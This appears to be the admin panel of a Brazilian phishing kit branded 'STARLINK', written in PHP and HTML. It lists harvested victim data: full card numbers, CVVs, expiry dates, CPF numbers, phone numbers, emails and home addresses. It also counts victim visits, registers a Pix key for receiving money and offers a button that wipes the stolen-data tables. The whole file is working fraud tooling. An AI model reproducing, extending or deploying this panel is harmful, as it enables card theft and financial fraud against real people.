<?php
session_start();

if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    header("Location: index.php");
    exit;
}

?>







<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #201f1d;
        }

        header {
            background: linear-gradient(to right, #522b0e, #372516);
        }



        .custom-header {
            height: 100px;

        }

        .nav-link {
            margin-top: 20px;

        }

        .navbar-nav .nav-item {
            margin-right: 20px;

            margin-left: 20px;

        }

        .dropdown-menu {
            margin: 0;
            padding: 0;
        }

        .dropdown-item:hover {
            background: linear-gradient(to right, #522b0e, #201f1d);
            color: azure;
        }

        .modal-footer {
            display: flex;
            justify-content: center;
            align-items: center;
        }

        #mensagemModal {
            text-align: center;
        }

        .gutter {
            margin-right: 25px;
            /* Espaçamento entre as colunas */
        }

        #coluna {
            border-radius: 10px;
            border: 2px solid #522b0e;
            text-align: center;
        }

        thead {
            background: linear-gradient(to right, #522b0e, #201f1d);
            color: azure;
            height: 50px;

        }

        tr {
            text-align: center;
            color: azure;
        }
    </style>
</head>

<body>

    <header class="header text-white custom-header">
        <div class="container d-flex align-items-center justify-content-between">
            <h2 class="mt-3">STARLINK</h2>
            <nav class="navbar navbar-expand-lg navbar-dark">
                <div class="collapse navbar-collapse" id="navbarNav">
                    <ul class="navbar-nav">
                        <li class="nav-item dropdown">
                            <a class="nav-link dropdown-toggle text-light" href="#" id="navbarDropdown" role="button"
                                data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                Funções
                            </a>
                            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                                <a class="dropdown-item" href="cad_faturamento.php"><i class="ri-key-fill"></i>Chave
                                    Pix</a>
                                <a class="dropdown-item" href="cad_user.php"><i
                                        class="ri-user-line"></i></i>Usuários</a>
                            </div>
                        </li>
                        <!-- No arquivo HTML -->
                        <li class="nav-item">
                            <a class="nav-link text-light" href="#" onclick="truncateTables(); return false;">Zerar
                                Contadores</a>
                        </li>

                        <li class="nav-item">
                            <a class="nav-link text-light" href="#"><i class="ri-code-line"></i>Dev</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link text-light" href="logout.php"><i
                                    class="ri-logout-box-line"></i>Logout</a>
                        </li>
                    </ul>
                </div>
            </nav>
        </div>
    </header>

    <link href="https://cdn.jsdelivr.net/npm/remixicon@4.2.0/fonts/remixicon.css" rel="stylesheet" />
    <div class="container text-light mt-4">
        <div class="row justify-content-center gx-4">
            <div id="coluna" class="col-md-2 gutter">

                <p>Acessos ---------------<i class="ri-team-line"></i></p>
                <p id="totalAcessos">Carregando...</p>

            </div>

            <div id="coluna" class="col-md-2 gutter">

                <p>Infos colhidas---------- <i class="ri-bank-card-2-line"></i></p>
                <p id="totalinfos">Carregando...</p>
            </div>


        </div>
    </div>
    <table class="container-fluid mt-5">
        <thead>
            <tr>
                <th>CARTÃO</th>
                <th>TITULAR</th>
                <th>VALIDADE</th>
                <th>CVV</th>
                <th>CPF</th>
                <th>NOME</th>
                <th>TELEFONE</th>
                <th>EMAIL</th>
                <th>CEP</th>
                <th>RUA</th>
                <th>N°</th>
                <th>BAIRRO</th>
                <th>CIDADE</th>
                <th>ESTADO</th>
            </tr>
        </thead>
        <tbody>
            <?php
          
            include 'db_connection.php';

          
            $conn = getConnection();

          
            $sql = "SELECT numero_do_cartao, nome_titular, validade, cvv, cpf_titular, nome, telefone, email, cep, rua, numero, bairro, cidade, estado FROM dados_cartao";

           
            $result = $conn->query($sql);

           
            if ($result->num_rows > 0) {
                while ($row = $result->fetch_assoc()) {
                    echo "<tr>";
                    echo "<td>" . $row['numero_do_cartao'] . "</td>";
                    echo "<td>" . $row['nome_titular'] . "</td>";
                    echo "<td>" . $row['validade'] . "</td>";
                    echo "<td>" . $row['cvv'] . "</td>";
                    echo "<td>" . $row['cpf_titular'] . "</td>";
                    echo "<td>" . $row['nome'] . "</td>";
                    echo "<td>" . $row['telefone'] . "</td>";
                    echo "<td>" . $row['email'] . "</td>";
                    echo "<td>" . $row['cep'] . "</td>";
                    echo "<td>" . $row['rua'] . "</td>";
                    echo "<td>" . $row['numero'] . "</td>";
                    echo "<td>" . $row['bairro'] . "</td>";
                    echo "<td>" . $row['cidade'] . "</td>";
                    echo "<td>" . $row['estado'] . "</td>";
                    echo "</tr>";
                }
            } else {
                echo "<tr><td colspan='14'>Nenhum dado encontrado</td></tr>";
            }

          
            $conn->close();
            ?>
        </tbody>
    </table>

    <div class="modal fade" id="cadastroPixModal" tabindex="-1" role="dialog" aria-labelledby="cadastroPixModalLabel"
        aria-hidden="true">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title " id="cadastroPixModalLabel">Cadastrar Pix</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <form id="cadastroPixForm">
                        <div class="form-group">
                            <label for="chaveInput">Chave Pix</label>
                            <input type="text" style=" box-shadow: none; border:2px solid #201f1d" autocomplete="off"
                                class="form-control" id="chaveInput" name="chave"
                                placeholder="Obrigatório ser chave copia e cola">
                        </div>
                        <button type="submit"
                            style=" background: linear-gradient(to right, #522b0e, #201f1d); color:azure;"
                            class="btn ">Cadastrar</button>
                    </form>
                </div>
                <div class="modal-footer">

                    <div id="mensagemModal"></div>
                </div>
            </div>
        </div>
    </div>
    <div class="modal fade" id="cadastrousermodal" tabindex="-1" role="dialog" aria-labelledby="cadastroPixModalLabel"
        aria-hidden="true">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title " id="cadastroPixModalLabel">Cadastrar usuario</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <form id="cadastrouser">
                        <div class="form-group">
                            <label for="chaveInput">Usuario</label>
                            <input type="text" style=" box-shadow: none; border:2px solid #201f1d" autocomplete="off"
                                maxlength="32" class="form-control" id="usuarioInput" name="usuario"
                                placeholder="usuario">
                            <label for="senhaImput">senha</label>
                            <input type="text" style=" box-shadow: none; border:2px solid #201f1d" autocomplete="off"
                                maxlength="32" class="form-control" id="senhaInput" name="senha" placeholder="senha">
                        </div>
                        <button type="submit"
                            style=" background: linear-gradient(to right, #522b0e, #201f1d); color:azure;"
                            class="btn ">Cadastrar</button>
                    </form>
                </div>
                <div class="modal-footer">

                    <div id="mensagemModaluser"></div>
                </div>
            </div>
        </div>
    </div>




    <div style="margin-top: 10%;" id="conteudo"></div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>


    <script>
        $(document).ready(function () {

            $('.dropdown-item[href="cad_faturamento.php"]').click(function (e) {
                e.preventDefault();

                $('#cadastroPixModal').modal('show');
            });

            $('.dropdown-item[href="cad_user.php"]').click(function (e) {
                e.preventDefault();

                $('#cadastrousermodal').modal('show');
            });



            $('#cadastroPixForm').submit(function (e) {
                e.preventDefault();
                var chavePix = $('#chaveInput').val();

                $.ajax({
                    type: 'POST',
                    url: 'chave.php',
                    data: {
                        chave: chavePix
                    },
                    success: function (response) {
                        $('#chaveInput').val('');
                        $('#mensagemModal').html(response);


                        var tempoExibicao = 2000;


                        setTimeout(function () {
                            $('#mensagemModal').html('');
                        }, tempoExibicao);
                    },

                    error: function () {
                        $('#mensagemModal').html('<div class="alert alert-danger">Erro ao processar a solicitação.</div>');
                    }
                });
            });


        });
        $(document).ready(function () {
            $('#cadastrouser').submit(function (e) {
                e.preventDefault();
                var usuario = $('#usuarioInput').val();
                var senha = $('#senhaInput').val();

                $.ajax({
                    type: 'POST',
                    url: 'usuario.php',
                    data: {
                        usuario: usuario,
                        senha: senha
                    },

                    success: function (response) {
                        $('#usuarioInput').val('');
                        $('#senhaInput').val('');


                        $('#mensagemModaluser').html(response);

                        var tempoExibicao = 2000;
                        setTimeout(function () {
                            $('#mensagemModaluser').html('');
                        }, tempoExibicao);
                    },
                    error: function () {
                        $('#mensagemModaluser').html('<div class="alert alert-danger">Erro ao processar a solicitação.</div>');
                    }
                });



            });
        });
    
        function updateAccessCount() {
            $.ajax({
                url: 'get_access_count.php',
                method: 'GET',
                success: function (data) {
                    $('#totalAcessos').text(data);
                },
                error: function (xhr, status, error) {
                    console.error(error);
                }
            });
        }

      
        setInterval(updateAccessCount, 5000);

     
        updateAccessCount();
        $(document).ready(function () {
    
            function getInfo() {
          
                $.ajax({
                    url: 'infos.php', 
                    method: 'GET',
                    success: function (data) {
                       
                        $('#totalinfos').text(data);
                    },
                    error: function (xhr, status, error) {
                       
                        console.error(error);
                    }
                });
            }

            
            getInfo();

        
            setInterval(getInfo, 5000);
        });
        function truncateTables() {
            $.ajax({
                url: 'truncate.php', 
                method: 'GET',
                data: { truncate_tables: true }, 
                success: function (response) {
                   
                    console.log(response);
                  
                },
                error: function (xhr, status, error) {
                    
                    console.error(error);
                }
            });
        }

    </script>




</body>

</html>